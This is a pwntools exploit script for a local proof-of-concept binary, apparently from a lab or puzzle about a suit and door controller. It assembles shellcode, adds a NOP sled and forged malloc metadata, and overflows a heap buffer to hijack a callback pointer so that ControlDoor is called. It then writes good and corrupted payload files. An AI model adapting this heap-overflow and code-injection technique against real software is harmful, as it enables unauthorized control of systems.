#!/usr/bin/env python3

# import variables/functions from pwntools into our global namespace,
# for easy access
from pwn import *

EXE_PATH = '/home/jdiamond/src/fatal_core_dump/bin/min_poc'

# HandleSetSuitOccupant
ORIGINAL_FUNCTION_ADDRESS = 0x55555555526e
# ControlDoor
INJECT_FUNCTION_ADDRESS = 0x5555555551e9

BUFFER_STACK_ADDRESS = 0x7fffffffebc0

CALLBACK_HEAP_ADDRESS = 0x555555559330

CHECK_VALUE_OFFSET = 16
CHECK_VALUE = ord('a')

DEVICE_ID = 0xae215d67
DOOR_DEVICE_ID = 0xae215e13

BUFFER_SIZE = 128
MALLOC_META_SIZE = 16

context.binary = EXE_PATH


# 21 is the malloc bookkeeping value. It appears to be the size + 1 including this metadata. For the function pointer (size 8 bytes) this appears to be the 16 byte minimum size + 16 bytes for the metadata.
MALLOC_META_DATA = b'\x00' * 8 + p32(0x21) + b'\x00' * 4

# Want this one to crash in function without corrupting the the call stack when first N bytes are corrupted (ideally with ascii).
sh = asm(f'''
    push    rbp
    mov     rbp,rsp
    movabs  rax, {ORIGINAL_FUNCTION_ADDRESS}
    mov     rbx, rdi
    add     rbx, {CHECK_VALUE_OFFSET}
    cmp     DWORD PTR [rbx], {CHECK_VALUE}
    jne     .L_skip
    push    rdi
    push    rsi
    push    rdx
    push    rax
    movabs  rax, {INJECT_FUNCTION_ADDRESS}
    mov     edi, {DEVICE_ID}
    mov     esi, {DOOR_DEVICE_ID}
    mov     edx, 1
    call    rax
    pop     rax
    mov     qword ptr [{CALLBACK_HEAP_ADDRESS}], rax
    pop     rdx
    pop     rsi
    pop     rdi
    nop
    nop
.L_skip:
    call    rax
    leave
    ret
''')

# Overall strategy:
# Write the checks for when to run the door open, and the call to the original function however works
# Stretch out the cleanup code for the door open call to be long enough to plausibly be the size of a setting block
# Besides the required stuff, this code can restore the original function pointer
# Align the shell code so a "block" overwrites the cleanup code and will trigger a crash.

print(f"Size of injection: {len(sh)}")

if len(sh) > BUFFER_SIZE:
    raise RuntimeError('len(sh) > BUFFER_SIZE')


filler_len = BUFFER_SIZE - len(sh)

payload = asm('nop') * filler_len
payload += sh
payload += MALLOC_META_DATA
payload += p64(BUFFER_STACK_ADDRESS + filler_len)

with open('./bin/input5_good', 'wb') as fd:
    fd.write(payload)


# ndisasm -b64 bin/input5_good
# ...
# 0000005B  BF675D21AE        mov edi,0xae215d67
# 00000060  BE135E21AE        mov esi,0xae215e13
# 00000065  BA01000000        mov edx,0x1
# 0000006A  FFD0              call rax
# 0000006C  58                pop rax
# 0000006D  48A3309355555555  mov [qword 0x555555559330],rax
#          -0000
# 00000077  5A                pop rdx
# 00000078  5E                pop rsi
# 00000079  5F                pop rdi
# 0000007A  90                nop
# 0000007B  90                nop
# 0000007C  FFD0              call rax
# 0000007E  C9                leave
# 0000007F  C3                ret

inject_call = payload.index(b'\xFF\xD0')
corruption_offset = inject_call + 2
corruption_len = 16

end_requirement = payload.index(b'\xFF\xD0', corruption_offset)
available_len = end_requirement - corruption_offset
if available_len < corruption_len:
    raise RuntimeError(f'available_len < corruption_len: {available_len} < {corruption_len}')

corrupt_data = b'bassvolm83______'.replace(b'_', b'\x00')

if len(corrupt_data) != corruption_len:
    raise RuntimeError('len(corrupt_data) != corruption_len')

bad_payload = payload[:corruption_offset] + corrupt_data + payload[corruption_offset + corruption_len:]

with open('./bin/input5_bad', 'wb') as fd:
    fd.write(bad_payload)
